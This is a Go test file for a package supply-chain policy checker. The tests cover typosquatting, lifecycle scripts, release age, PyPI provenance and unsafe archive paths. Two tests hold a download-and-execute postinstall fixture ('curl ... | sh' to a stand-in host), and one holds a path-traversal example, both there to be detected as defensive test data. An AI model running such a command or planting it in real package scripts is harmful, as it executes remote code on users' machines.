package checks

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/sourcegate/sourcegate/internal/config"
	"github.com/sourcegate/sourcegate/internal/report"
)

func TestEvaluateEmitsInformFindingAndAllows(t *testing.T) {
	pkg := report.PackageReport{
		VersionCount: 1,
	}
	config := config.Config{
		Policy: config.PolicyConfig{
			Inform: config.PolicyTierConfig{
				AlertOnFirstRelease: true,
			},
		},
	}

	Evaluate(&pkg, config, time.Date(2026, 5, 27, 12, 0, 0, 0, time.UTC))

	if pkg.Decision != report.DecisionAllow {
		t.Fatalf("decision = %q, want %q", pkg.Decision, report.DecisionAllow)
	}
	if len(pkg.Findings) != 1 || pkg.Findings[0].Severity != levelInform {
		t.Fatalf("unexpected findings: %+v", pkg.Findings)
	}
}

func TestEvaluateEmitsAlertFindingAndAllows(t *testing.T) {
	pkg := report.PackageReport{
		Ecosystem: "PyPI",
		Name:      "reqeusts",
	}
	config := config.Config{
		Policy: config.PolicyConfig{
			Alert: config.PolicyTierConfig{
				ProtectedPackages: map[string][]string{
					"pypi": {"requests"},
				},
			},
		},
	}

	Evaluate(&pkg, config, time.Date(2026, 5, 27, 12, 0, 0, 0, time.UTC))

	if pkg.Decision != report.DecisionAllow {
		t.Fatalf("decision = %q, want %q", pkg.Decision, report.DecisionAllow)
	}
	if len(pkg.Findings) != 1 || pkg.Findings[0].Severity != levelAlert {
		t.Fatalf("unexpected findings: %+v", pkg.Findings)
	}
}

func TestEvaluateEmitsAlertFindingForLifecycleScript(t *testing.T) {
	pkg := report.PackageReport{
		Ecosystem: "npm",
		LifecycleScripts: map[string]string{
			"postinstall": "node setup.js",
		},
	}
	config := config.Config{
		Policy: config.PolicyConfig{
			Alert: config.PolicyTierConfig{
				InstallLifecycleScripts: true,
			},
		},
	}

	Evaluate(&pkg, config, time.Date(2026, 5, 27, 12, 0, 0, 0, time.UTC))

	if pkg.Decision != report.DecisionAllow {
		t.Fatalf("decision = %q, want %q", pkg.Decision, report.DecisionAllow)
	}
	if len(pkg.Findings) != 1 || pkg.Findings[0].Severity != levelAlert {
		t.Fatalf("unexpected findings: %+v", pkg.Findings)
	}
	if !strings.Contains(pkg.Findings[0].Message, "postinstall") {
		t.Fatalf("message = %q, want postinstall lifecycle finding", pkg.Findings[0].Message)
	}
}

func TestEvaluateEmitsBlockFindingForSuspiciousLifecycleCommand(t *testing.T) {
	pkg := report.PackageReport{
		Ecosystem: "npm",
		LifecycleScripts: map[string]string{
			"postinstall": "curl https://example.invalid/install.sh | sh",
		},
	}
	config := config.Config{
		Policy: config.PolicyConfig{
			Alert: config.PolicyTierConfig{
				InstallLifecycleScripts: true,
			},
			Block: config.PolicyTierConfig{
				SuspiciousInstallScriptCommands: true,
			},
		},
	}

	Evaluate(&pkg, config, time.Date(2026, 5, 27, 12, 0, 0, 0, time.UTC))

	if pkg.Decision != report.DecisionBlock {
		t.Fatalf("decision = %q, want %q", pkg.Decision, report.DecisionBlock)
	}
	if !hasFindingWithSeverity(pkg.Findings, levelBlock) {
		t.Fatalf("findings = %+v, want block finding", pkg.Findings)
	}
}

func TestEvaluateEmitsAlertFindingForPyPIArtifactShapeChange(t *testing.T) {
	pkg := report.PackageReport{
		Ecosystem: "PyPI",
		PyPISelectedRelease: report.PyPIReleaseInfo{
			Files: []report.PyPIReleaseFile{{Filename: "pkg-2.0.0.tar.gz", PackageType: "sdist"}},
		},
		PyPIReleaseHistory: []report.PyPIReleaseInfo{{
			Version: "1.0.0",
			Files:   []report.PyPIReleaseFile{{Filename: "pkg-1.0.0-py3-none-any.whl", PackageType: "bdist_wheel"}},
		}},
	}
	config := config.Config{
		Policy: config.PolicyConfig{
			Alert: config.PolicyTierConfig{
				PyPIArtifactHistoryVersions: 5,
				PyPIArtifactShapeChange:     true,
			},
		},
	}

	Evaluate(&pkg, config, time.Date(2026, 5, 29, 12, 0, 0, 0, time.UTC))

	if pkg.Decision != report.DecisionAllow {
		t.Fatalf("decision = %q, want %q", pkg.Decision, report.DecisionAllow)
	}
	if len(pkg.Findings) == 0 || pkg.Findings[0].Severity != levelAlert {
		t.Fatalf("unexpected findings: %+v", pkg.Findings)
	}
}

func TestEvaluateKeepsStrongestPyPIArtifactTier(t *testing.T) {
	pkg := report.PackageReport{
		Ecosystem: "PyPI",
		PyPISelectedRelease: report.PyPIReleaseInfo{
			Files: []report.PyPIReleaseFile{{Filename: "pkg-2.0.0.tar.gz", PackageType: "sdist"}},
		},
		PyPIReleaseHistory: []report.PyPIReleaseInfo{{
			Version: "1.0.0",
			Files:   []report.PyPIReleaseFile{{Filename: "pkg-1.0.0-py3-none-any.whl", PackageType: "bdist_wheel"}},
		}},
	}
	config := config.Config{
		Policy: config.PolicyConfig{
			Inform: config.PolicyTierConfig{
				PyPIArtifactHistoryVersions: 5,
				PyPIArtifactShapeChange:     true,
			},
			Block: config.PolicyTierConfig{
				PyPIArtifactHistoryVersions: 5,
				PyPIArtifactShapeChange:     true,
			},
		},
	}

	Evaluate(&pkg, config, time.Date(2026, 5, 29, 12, 0, 0, 0, time.UTC))

	if len(pkg.Findings) == 0 {
		t.Fatalf("findings = %+v, want at least 1 finding", pkg.Findings)
	}
	if pkg.Findings[0].Severity != levelBlock {
		t.Fatalf("severity = %q, want %q", pkg.Findings[0].Severity, levelBlock)
	}
	if pkg.Decision != report.DecisionBlock {
		t.Fatalf("decision = %q, want %q", pkg.Decision, report.DecisionBlock)
	}
}

func TestEvaluateEmitsBlockFindingAndBlocks(t *testing.T) {
	pkg := report.PackageReport{
		SelectedPublishedAt: "2026-05-26T12:00:00Z",
	}
	config := config.Config{
		Policy: config.PolicyConfig{
			Block: config.PolicyTierConfig{
				MinimumDaysSinceLatestRelease: 3,
			},
		},
	}

	Evaluate(&pkg, config, time.Date(2026, 5, 27, 12, 0, 0, 0, time.UTC))

	if pkg.Decision != report.DecisionBlock {
		t.Fatalf("decision = %q, want %q", pkg.Decision, report.DecisionBlock)
	}
	if len(pkg.Findings) != 1 || pkg.Findings[0].Severity != levelBlock {
		t.Fatalf("unexpected findings: %+v", pkg.Findings)
	}
}

func TestEvaluateKeepsStrongestLifecycleTier(t *testing.T) {
	pkg := report.PackageReport{
		Ecosystem: "npm",
		LifecycleScripts: map[string]string{
			"install": "node setup.js",
		},
	}
	config := config.Config{
		Policy: config.PolicyConfig{
			Inform: config.PolicyTierConfig{
				InstallLifecycleScripts: true,
			},
			Alert: config.PolicyTierConfig{
				InstallLifecycleScripts: true,
			},
		},
	}

	Evaluate(&pkg, config, time.Date(2026, 5, 28, 12, 0, 0, 0, time.UTC))

	if len(pkg.Findings) != 1 {
		t.Fatalf("findings = %+v, want 1 finding", pkg.Findings)
	}
	if pkg.Findings[0].Severity != levelAlert {
		t.Fatalf("severity = %q, want %q", pkg.Findings[0].Severity, levelAlert)
	}
}

func TestEvaluateKeepsOnlyStrongestMatchingTierPerCheck(t *testing.T) {
	pkg := report.PackageReport{
		SelectedPublishedAt: "2026-05-27T12:00:00Z",
	}
	config := config.Config{
		Policy: config.PolicyConfig{
			Inform: config.PolicyTierConfig{
				MinimumDaysSinceLatestRelease: 2,
			},
			Alert: config.PolicyTierConfig{
				MinimumDaysSinceLatestRelease: 3,
			},
			Block: config.PolicyTierConfig{
				MinimumDaysSinceLatestRelease: 7,
			},
		},
	}

	Evaluate(&pkg, config, time.Date(2026, 5, 28, 12, 0, 0, 0, time.UTC))

	if len(pkg.Findings) != 1 {
		t.Fatalf("findings = %+v, want 1 finding", pkg.Findings)
	}
	if pkg.Findings[0].Severity != levelBlock {
		t.Fatalf("severity = %q, want %q", pkg.Findings[0].Severity, levelBlock)
	}
	if !strings.Contains(pkg.Findings[0].Message, "7 day(s)") {
		t.Fatalf("message = %q, want block-tier threshold", pkg.Findings[0].Message)
	}
}

func TestEvaluateAllowsWhenPolicyConfiguredButNoFindings(t *testing.T) {
	pkg := report.PackageReport{
		SelectedPublishedAt: "2026-05-20T12:00:00Z",
	}
	config := config.Config{
		Policy: config.PolicyConfig{
			Alert: config.PolicyTierConfig{
				MinimumDaysSinceLatestRelease: 3,
			},
		},
	}

	Evaluate(&pkg, config, time.Date(2026, 5, 27, 12, 0, 0, 0, time.UTC))

	if pkg.Decision != report.DecisionAllow {
		t.Fatalf("decision = %q, want %q", pkg.Decision, report.DecisionAllow)
	}
	if len(pkg.Findings) != 0 {
		t.Fatalf("findings = %+v, want none", pkg.Findings)
	}
}

func TestEvaluateLeavesInspectOnlyWhenDisabled(t *testing.T) {
	pkg := report.PackageReport{
		SelectedPublishedAt: "2026-05-27T12:00:00Z",
	}

	Evaluate(&pkg, config.Config{}, time.Date(2026, 5, 27, 12, 0, 0, 0, time.UTC))

	if pkg.Decision != report.DecisionInspectOnly {
		t.Fatalf("decision = %q, want %q", pkg.Decision, report.DecisionInspectOnly)
	}
}

func TestEvaluateLeavesInspectOnlyWhenFlexibleFalseValuesDisablePolicy(t *testing.T) {
	path := filepath.Join(t.TempDir(), "sourcegate.config.json")
	configData, err := json.Marshal(config.Config{Policy: config.PolicyConfig{}})
	if err != nil {
		t.Fatalf("marshal config: %v", err)
	}
	if err := os.WriteFile(path, configData, 0600); err != nil {
		t.Fatalf("write config: %v", err)
	}

	config, err := config.Load(path)
	if err != nil {
		t.Fatalf("Load returned error: %v", err)
	}

	pkg := report.PackageReport{
		Ecosystem:           "PyPI",
		Name:                "reqeusts",
		SelectedPublishedAt: "2026-05-29T12:00:00Z",
		PreviousPublishedAt: "2025-01-01T12:00:00Z",
		LifecycleScripts:    map[string]string{"postinstall": "node setup.js"},
	}

	Evaluate(&pkg, config, time.Date(2026, 5, 29, 12, 0, 0, 0, time.UTC))

	if pkg.Decision != report.DecisionInspectOnly {
		t.Fatalf("decision = %q, want %q", pkg.Decision, report.DecisionInspectOnly)
	}
	if len(pkg.Findings) != 0 {
		t.Fatalf("findings = %+v, want none", pkg.Findings)
	}
}

func TestEvaluateWithOptionsCollectsNPMDebugTrace(t *testing.T) {
	pkg := report.PackageReport{
		Ecosystem: "npm",
		LifecycleScripts: map[string]string{
			"postinstall": "curl https://example.invalid/install.sh | sh",
		},
		LifecycleHistory: []report.VersionLifecycleScripts{
			{Version: "1.0.0", ScriptsKnown: true},
		},
	}
	config := config.Config{
		Policy: config.PolicyConfig{
			Alert: config.PolicyTierConfig{
				InstallLifecycleScripts:         true,
				InstallLifecycleHistoryVersions: 5,
			},
			Block: config.PolicyTierConfig{
				SuspiciousInstallScriptCommands: true,
			},
		},
	}

	EvaluateWithOptions(&pkg, config, time.Date(2026, 5, 29, 12, 0, 0, 0, time.UTC), EvaluationOptions{Debug: true})

	suspicious := findTrace(t, pkg.DebugTrace, "npm_suspicious_install_commands")
	if suspicious.Status != report.DebugTraceMatch || suspicious.Severity != levelBlock {
		t.Fatalf("suspicious trace = %+v, want BLOCK match", suspicious)
	}
	if !containsEvidence(suspicious, "download-and-execute") {
		t.Fatalf("suspicious trace evidence = %+v, want command reason", suspicious.Evidence)
	}

	history := findTrace(t, pkg.DebugTrace, "npm_lifecycle_history")
	if history.Status != report.DebugTraceMatch || history.Severity != levelAlert {
		t.Fatalf("history trace = %+v, want ALERT match", history)
	}
	if !containsEvidence(history, "absent from immediate previous version 1.0.0") {
		t.Fatalf("history trace evidence = %+v, want immediate comparison result", history.Evidence)
	}

	if got := findTrace(t, pkg.DebugTrace, "pypi_dependency_change").Status; got != report.DebugTraceNotApplicable {
		t.Fatalf("pypi dependency trace status = %q, want NOT APPLICABLE", got)
	}
}

func TestEvaluateWithOptionsCollectsPyPIDebugTrace(t *testing.T) {
	pkg := report.PackageReport{
		Ecosystem: "PyPI",
		PyPISelectedRelease: report.PyPIReleaseInfo{
			Version:           "2.0.0",
			Dependencies:      []string{"new-dependency"},
			DependenciesKnown: true,
			Files: []report.PyPIReleaseFile{
				{Filename: "pkg-2.0.0-py3-none-any.whl", PackageType: "bdist_wheel", Size: 200, ProvenanceChecked: true, ProvenanceAvailable: true, ProvenanceScopes: []string{"install-target"}},
				{Filename: "pkg-2.0.0.tar.gz", PackageType: "sdist", Size: 400, ProvenanceChecked: true, ProvenanceScopes: []string{"install-target"}},
			},
		},
		PyPIReleaseHistory: []report.PyPIReleaseInfo{{
			Version:           "1.0.0",
			Dependencies:      []string{"old-dependency"},
			DependenciesKnown: true,
			Files:             []report.PyPIReleaseFile{{Filename: "pkg-1.0.0-py3-none-any.whl", PackageType: "bdist_wheel", Size: 100}},
		}},
	}
	config := config.Config{
		Policy: config.PolicyConfig{
			Alert: config.PolicyTierConfig{
				PyPIArtifactHistoryVersions: 5,
				PyPIDependencyChange:        true,
				PyPIProvenanceRequired:      true,
				PyPIProvenanceScope:         "install-target",
				PyPIReleaseFileCountChange:  true,
			},
		},
	}
	pkg.PyPIProvenance.RequestedScopes = []string{"install-target"}

	EvaluateWithOptions(&pkg, config, time.Date(2026, 5, 29, 12, 0, 0, 0, time.UTC), EvaluationOptions{Debug: true})

	dependencies := findTrace(t, pkg.DebugTrace, "pypi_dependency_change")
	if dependencies.Status != report.DebugTraceMatch || dependencies.Severity != levelAlert {
		t.Fatalf("dependency trace = %+v, want ALERT match", dependencies)
	}
	for _, want := range []string{"compared against version: 1.0.0", "added dependencies: new-dependency", "removed dependencies: old-dependency"} {
		if !containsEvidence(dependencies, want) {
			t.Fatalf("dependency trace evidence = %+v, want %q", dependencies.Evidence, want)
		}
	}

	provenance := findTrace(t, pkg.DebugTrace, "pypi_provenance")
	if provenance.Status != report.DebugTraceMatch || !containsEvidence(provenance, "provenance available: 1") || !containsEvidence(provenance, "pkg-2.0.0.tar.gz") {
		t.Fatalf("provenance trace = %+v, want summarized missing provenance", provenance)
	}

	fileCount := findTrace(t, pkg.DebugTrace, "pypi_release_file_count")
	if fileCount.Status != report.DebugTraceMatch || !containsEvidence(fileCount, "historical median file count: 1") {
		t.Fatalf("file count trace = %+v, want count comparison", fileCount)
	}
}

func TestEvaluateWithOptionsCollectsDisabledTraceWhenPolicyDisabled(t *testing.T) {
	pkg := report.PackageReport{Ecosystem: "PyPI"}

	EvaluateWithOptions(&pkg, config.Config{}, time.Date(2026, 5, 29, 12, 0, 0, 0, time.UTC), EvaluationOptions{Debug: true})

	if pkg.Decision != report.DecisionInspectOnly {
		t.Fatalf("decision = %q, want %q", pkg.Decision, report.DecisionInspectOnly)
	}
	if got := findTrace(t, pkg.DebugTrace, "release_age").Status; got != report.DebugTraceDisabled {
		t.Fatalf("release age trace status = %q, want DISABLED", got)
	}
	if got := findTrace(t, pkg.DebugTrace, "npm_lifecycle_scripts").Status; got != report.DebugTraceNotApplicable {
		t.Fatalf("npm lifecycle trace status = %q, want NOT APPLICABLE", got)
	}
	if got := findTrace(t, pkg.DebugTrace, "pypi_artifact_history").Status; got != report.DebugTraceDisabled {
		t.Fatalf("pypi artifact history trace status = %q, want DISABLED", got)
	}
}

func TestEvaluateWithOptionsMarksUnreliableHistoryIndeterminate(t *testing.T) {
	pkg := report.PackageReport{
		Ecosystem:           "npm",
		SelectedPublishedAt: "2026-05-29T00:00:00Z",
		PreviousPublishedAt: "2026-01-01T00:00:00Z",
		NPMHistory: report.HistoryDiagnostics{
			IndeterminateReason: "npm release history contains malformed version or publish-time metadata",
		},
	}
	config := config.Config{
		Policy: config.PolicyConfig{
			Alert: config.PolicyTierConfig{DormantReleaseThresholdDays: 30},
		},
	}

	EvaluateWithOptions(&pkg, config, time.Date(2026, 5, 30, 12, 0, 0, 0, time.UTC), EvaluationOptions{Debug: true})

	trace := findTrace(t, pkg.DebugTrace, "dormant_release")
	if trace.Status != report.DebugTraceIndeterminate || trace.Severity != levelAlert {
		t.Fatalf("trace = %+v, want ALERT indeterminate", trace)
	}
	if len(pkg.Findings) != 1 || !strings.Contains(pkg.Findings[0].Message, "indeterminate") {
		t.Fatalf("findings = %+v, want indeterminate finding", pkg.Findings)
	}
}

func TestEvaluateMarksUnknownImmediateNPMHistoryIndeterminate(t *testing.T) {
	pkg := report.PackageReport{
		Ecosystem:        "npm",
		LifecycleScripts: map[string]string{"install": "node install.js"},
		LifecycleHistory: []report.VersionLifecycleScripts{{Version: "1.0.0", ScriptsKnown: false}},
	}
	cfg := config.Config{Policy: config.PolicyConfig{
		Alert: config.PolicyTierConfig{InstallLifecycleHistoryVersions: 5},
	}}

	EvaluateWithOptions(&pkg, cfg, time.Now(), EvaluationOptions{Debug: true})

	trace := findTrace(t, pkg.DebugTrace, "npm_lifecycle_history")
	if trace.Status != report.DebugTraceIndeterminate || !containsEvidence(trace, "immediate previous") {
		t.Fatalf("trace = %+v, want immediate-history indeterminate trace", trace)
	}
}

func TestEvaluateMarksUnknownImmediatePyPIDependenciesIndeterminate(t *testing.T) {
	pkg := report.PackageReport{
		Ecosystem: "PyPI",
		PyPISelectedRelease: report.PyPIReleaseInfo{
			DependenciesKnown: true,
		},
		PyPIReleaseHistory: []report.PyPIReleaseInfo{{Version: "1.0.0", DependenciesKnown: false}},
	}
	cfg := config.Config{Policy: config.PolicyConfig{
		Alert: config.PolicyTierConfig{PyPIArtifactHistoryVersions: 5, PyPIDependencyChange: true},
	}}

	EvaluateWithOptions(&pkg, cfg, time.Now(), EvaluationOptions{Debug: true})

	trace := findTrace(t, pkg.DebugTrace, "pypi_dependency_change")
	if trace.Status != report.DebugTraceIndeterminate || !containsEvidence(trace, "immediate previous") {
		t.Fatalf("trace = %+v, want immediate dependency indeterminate trace", trace)
	}
}

func TestEvaluateInstallTargetCompatibilityFailureKeepsKnownProvenanceFindings(t *testing.T) {
	pkg := report.PackageReport{
		Ecosystem: "PyPI",
		PyPISelectedRelease: report.PyPIReleaseInfo{Files: []report.PyPIReleaseFile{{
			Filename:          "pkg-1.0.0.tar.gz",
			PackageType:       "sdist",
			ProvenanceChecked: true,
			ProvenanceScopes:  []string{"install-target"},
		}}},
		PyPIProvenance: report.PyPIProvenanceSummary{CompatibilityError: "pip debug failed"},
	}
	cfg := config.Config{Policy: config.PolicyConfig{
		Alert: config.PolicyTierConfig{PyPIProvenanceRequired: true, PyPIProvenanceScope: "install-target"},
	}}

	EvaluateWithOptions(&pkg, cfg, time.Now(), EvaluationOptions{Debug: true})

	trace := findTrace(t, pkg.DebugTrace, "pypi_provenance")
	if trace.Status != report.DebugTraceIndeterminate || len(pkg.Findings) != 2 {
		t.Fatalf("trace = %+v findings = %+v, want known missing provenance plus indeterminate finding", trace, pkg.Findings)
	}
}

func TestEvaluateArtifactInspectionAddsFindingsAndDecision(t *testing.T) {
	pkg := report.PackageReport{
		Decision: report.DecisionAllow,
		ArtifactInspection: &report.ArtifactInspectionSummary{
			ArchiveFormat:            "tar.gz",
			FileCount:                3,
			TotalUncompressedBytes:   2 * 1024 * 1024,
			CompressedBytes:          1024,
			ExpansionRatio:           2048,
			ExpansionRatioApplicable: true,
			UnsafePathCount:          1,
			UnsafePathExamples:       []string{"path traversal: ../evil.js"},
		},
	}
	cfg := config.Config{Policy: config.PolicyConfig{
		Inform: config.PolicyTierConfig{ArtifactMaxFileCount: 2},
		Alert:  config.PolicyTierConfig{ArtifactMaxUncompressedSizeMB: 1},
		Block:  config.PolicyTierConfig{ArtifactUnsafePaths: true, ArtifactMaxExpansionRatio: 100},
	}}

	EvaluateArtifactInspection(&pkg, cfg, EvaluationOptions{Debug: true})

	if pkg.Decision != report.DecisionBlock {
		t.Fatalf("decision = %q, want BLOCK", pkg.Decision)
	}
	if !hasFindingWithSeverity(pkg.Findings, levelBlock) || !hasFindingWithSeverity(pkg.Findings, levelAlert) || !hasFindingWithSeverity(pkg.Findings, levelInform) {
		t.Fatalf("findings = %+v, want findings across configured tiers", pkg.Findings)
	}
	trace := findTrace(t, pkg.DebugTrace, "artifact_unsafe_paths")
	if trace.Status != report.DebugTraceMatch || trace.Severity != levelBlock || !containsEvidence(trace, "../evil.js") {
		t.Fatalf("trace = %+v, want block match with unsafe path evidence", trace)
	}
}

func TestEvaluateArtifactInspectionAddsExecutionSurfaceFinding(t *testing.T) {
	pkg := report.PackageReport{
		Decision: report.DecisionAllow,
		ArtifactInspection: &report.ArtifactInspectionSummary{
			ArchiveFormat:         "tar.gz",
			ExecutionSurfaceCount: 1,
			ExecutionSurfaceExamples: []report.ArtifactExecutionSurface{
				{Type: "npm_lifecycle_script", Path: "package/package.json", Name: "postinstall", Detail: "node setup.js"},
			},
		},
	}
	cfg := config.Config{Policy: config.PolicyConfig{
		Alert: config.PolicyTierConfig{ArtifactExecutionSurfaces: true},
	}}

	EvaluateArtifactInspection(&pkg, cfg, EvaluationOptions{Debug: true})

	if pkg.Decision != report.DecisionAllow {
		t.Fatalf("decision = %q, want ALLOW", pkg.Decision)
	}
	if len(pkg.Findings) != 1 || pkg.Findings[0].Severity != levelAlert || !strings.Contains(pkg.Findings[0].Message, "postinstall") {
		t.Fatalf("findings = %+v, want alert execution surface finding", pkg.Findings)
	}
	trace := findTrace(t, pkg.DebugTrace, "artifact_execution_surfaces")
	if trace.Status != report.DebugTraceMatch || trace.Severity != levelAlert || !containsEvidence(trace, "postinstall") {
		t.Fatalf("trace = %+v, want alert match with surface evidence", trace)
	}
}

func TestEvaluateArtifactInspectionLeavesMetadataOnlyEvaluationUnchanged(t *testing.T) {
	pkg := report.PackageReport{}
	cfg := config.Config{Policy: config.PolicyConfig{
		Block: config.PolicyTierConfig{ArtifactUnsafePaths: true},
	}}

	EvaluateWithOptions(&pkg, cfg, time.Now(), EvaluationOptions{})

	if pkg.Decision != report.DecisionInspectOnly || len(pkg.Findings) != 0 || pkg.PolicySummary != "" {
		t.Fatalf("pkg = %+v, want metadata-only evaluation unchanged by artifact policy", pkg)
	}
}

func hasFindingWithSeverity(findings []report.Finding, severity string) bool {
	for _, finding := range findings {
		if finding.Severity == severity {
			return true
		}
	}
	return false
}

func findTrace(t *testing.T, trace []report.DebugTraceEntry, checkID string) report.DebugTraceEntry {
	t.Helper()
	for _, entry := range trace {
		if entry.CheckID == checkID {
			return entry
		}
	}
	t.Fatalf("trace missing %q: %+v", checkID, trace)
	return report.DebugTraceEntry{}
}

func containsEvidence(entry report.DebugTraceEntry, want string) bool {
	for _, evidence := range entry.Evidence {
		if strings.Contains(evidence, want) {
			return true
		}
	}
	return false
}
